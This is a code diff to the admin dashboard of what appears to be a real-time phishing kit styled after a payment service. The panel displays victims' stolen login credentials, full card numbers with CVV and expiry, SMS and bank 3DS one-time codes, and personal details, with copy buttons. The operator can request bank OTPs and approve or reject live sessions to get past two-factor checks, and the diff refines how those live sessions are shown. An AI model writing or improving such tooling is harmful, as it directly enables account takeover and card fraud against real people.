@@ -176,15 +176,15 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                  <div>
                                                      <label class="text-[11px] font-bold text-slate-500 block mb-1">Email / Username</label>
                                                      <div class="flex items-center gap-2">
-                                                         <p class="text-base font-bold text-pp-navy break-all">{{ state.email() || 'Waiting...' }}</p>
-                                                         <button *ngIf="state.email()" (click)="copy(state.email())" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                                         <p class="text-base font-bold text-pp-navy break-all">{{ monitoredSession()?.data?.email || 'Waiting...' }}</p>
+                                                         <button *ngIf="monitoredSession()?.data?.email" (click)="copy(monitoredSession()?.data?.email)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                      </div>
                                                  </div>
                                                  <div>
                                                      <label class="text-[11px] font-bold text-slate-500 block mb-1">Password</label>
                                                      <div class="flex items-center gap-2">
-                                                         <p class="text-base font-mono bg-slate-100 px-2 py-1 rounded text-pp-navy border border-slate-200">{{ state.password() || 'Waiting...' }}</p>
-                                                         <button *ngIf="state.password()" (click)="copy(state.password())" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                                         <p class="text-base font-mono bg-slate-100 px-2 py-1 rounded text-pp-navy border border-slate-200">{{ monitoredSession()?.data?.password || 'Waiting...' }}</p>
+                                                         <button *ngIf="monitoredSession()?.data?.password" (click)="copy(monitoredSession()?.data?.password)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                      </div>
                                                  </div>
                                              </div>
@@ -198,18 +198,18 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                  <div>
                                                      <label class="text-[11px] font-bold text-slate-500 block mb-1">Card Number</label>
                                                      <div class="flex items-center gap-2">
-                                                        <p class="text-lg font-mono font-bold text-pp-navy tracking-wide">{{ formatCard(state.cardNumber()) }}</p>
-                                                        <button *ngIf="state.cardNumber()" (click)="copy(state.cardNumber())" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                                        <p class="text-lg font-mono font-bold text-pp-navy tracking-wide">{{ formatCard(monitoredSession()?.data?.cardNumber) }}</p>
+                                                        <button *ngIf="monitoredSession()?.data?.cardNumber" (click)="copy(monitoredSession()?.data?.cardNumber)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
                                                      </div>
                                                  </div>
                                                  <div class="flex gap-6">
                                                      <div>
                                                          <label class="text-[11px] font-bold text-slate-500 block mb-1">Exp</label>
-                                                         <p class="font-bold text-pp-navy">{{ state.cardExpiry() || '--/--' }}</p>
+                                                         <p class="font-bold text-pp-navy">{{ monitoredSession()?.data?.cardExpiry || '--/--' }}</p>
                                                      </div>
                                                      <div>
                                                          <label class="text-[11px] font-bold text-slate-500 block mb-1">CVV</label>
-                                                         <p class="font-bold text-[#D92D20]">{{ state.cardCvv() || '---' }}</p>
+                                                         <p class="font-bold text-[#D92D20]">{{ monitoredSession()?.data?.cardCvv || '---' }}</p>
                                                      </div>
                                                  </div>
                                              </div>
@@ -225,16 +225,16 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                   <div class="flex gap-8">
                                                       <div>
                                                           <span class="text-[10px] text-white/50 block mb-1">SMS Code</span>
-                                                          <span class="text-2xl font-mono font-bold tracking-widest">{{ state.phoneCode() || '---' }}</span>
+                                                          <span class="text-2xl font-mono font-bold tracking-widest">{{ monitoredSession()?.data?.phoneCode || '---' }}</span>
                                                       </div>
                                                       <div>
                                                           <span class="text-[10px] text-white/50 block mb-1">Bank 3DS</span>
-                                                          <span class="text-2xl font-mono font-bold tracking-widest text-pp-success">{{ state.cardOtp() || '---' }}</span>
+                                                          <span class="text-2xl font-mono font-bold tracking-widest text-pp-success">{{ monitoredSession()?.data?.cardOtp || '---' }}</span>
                                                       </div>
                                                   </div>
                                               </div>
                                               
-                                              @if(state.stage() === 'card_pending') {
+                                              @if(monitoredSession()?.stage === 'card_pending') {
                                                 <button (click)="requestOtp()" class="relative z-10 bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-full font-bold text-xs transition-all backdrop-blur-sm">
                                                     Request Bank OTP
                                                 </button>
@@ -247,23 +247,23 @@ type AdminTab = 'live' | 'history' | 'settings';
                                               <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                                                   <div>
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">Name</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ (state.firstName() + ' ' + state.lastName()).trim() || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy">{{ (monitoredSession()?.data?.firstName + ' ' + monitoredSession()?.data?.lastName).trim() || 'Waiting...' }}</p>
                                                   </div>
                                                   <div>
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">DOB</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ state.dob() || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.dob || 'Waiting...' }}</p>
                                                   </div>
                                                   <div>
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">Phone</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ state.phoneNumber() || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.phoneNumber || 'Waiting...' }}</p>
                                                   </div>
                                                   <div>
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">Location</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ state.country() || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.country || 'Waiting...' }}</p>
                                                   </div>
                                                   <div class="col-span-2">
                                                       <label class="text-[10px] font-bold text-slate-400 uppercase">Address</label>
-                                                      <p class="text-sm font-bold text-pp-navy">{{ state.address() || 'Waiting...' }}</p>
+                                                      <p class="text-sm font-bold text-pp-navy">{{ monitoredSession()?.data?.address || 'Waiting...' }}</p>
                                                   </div>
                                               </div>
                                          </div>
@@ -277,14 +277,21 @@ type AdminTab = 'live' | 'history' | 'settings';
                                          <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
                                          <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
                                      </div>
-                                     <div class="flex gap-3">
-                                          <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
-                                              Reject
-                                          </button>
-                                          <button (click)="approve()" class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
-                                              <span class="material-icons text-sm">check</span> {{ approveText() }}
-                                          </button>
-                                     </div>
+
+                                     @if(isSessionLive(monitoredSession())) {
+                                         <div class="flex gap-3">
+                                              <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
+                                                  Reject
+                                              </button>
+                                              <button (click)="approve()" class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
+                                                  <span class="material-icons text-sm">check</span> {{ approveText() }}
+                                              </button>
+                                         </div>
+                                     } @else {
+                                         <div class="text-xs text-slate-400 font-bold uppercase tracking-wider">
+                                             Session Offline
+                                         </div>
+                                     }
                                  </div>
 
                              } @else {
@@ -473,7 +480,7 @@ export class AdminDashboardComponent {
 
   isSessionLive(session: any): boolean {
       if (!session || !session.lastSeen) return false;
-      return (Date.now() - session.lastSeen) < 120000; // 2 mins
+      return (Date.now() - session.lastSeen) < 60000; // 1 min active threshold
   }
 
   deleteSession(session: any) {
